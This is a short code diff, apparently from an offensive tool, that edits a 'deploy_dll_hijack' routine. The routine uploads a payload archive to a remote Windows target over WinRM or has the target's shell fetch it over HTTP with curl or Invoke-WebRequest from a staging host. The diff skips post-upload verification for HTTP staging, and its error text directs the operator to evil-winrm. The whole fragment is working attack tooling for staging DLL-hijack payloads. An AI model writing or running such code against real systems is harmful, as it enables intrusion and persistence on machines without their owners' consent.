@@ -301,8 +301,14 @@ def deploy_dll_hijack(
                 shell="powershell",
             )
 
-        upload_file(client, build.zip_path, remote_path_fwd, http_fetch_host=fetch_host)
-        if not remote_file_ok(client, remote_path_fwd, expected_size=build.zip_path.stat().st_size):
+        upload_method = upload_file(
+            client, build.zip_path, remote_path_fwd, http_fetch_host=fetch_host
+        )
+        # HTTP staging is already confirmed by the remote shell fetching via curl/IWR;
+        # a follow-up WinRM verification often fails due to execution policy, so skip it.
+        if upload_method != "http" and not remote_file_ok(
+            client, remote_path_fwd, expected_size=build.zip_path.stat().st_size
+        ):
             raise RuntimeError(
                 "upload not verified on target — use interactive evil-winrm: "
                 f"upload {build.zip_path.resolve()} {remote_path}"
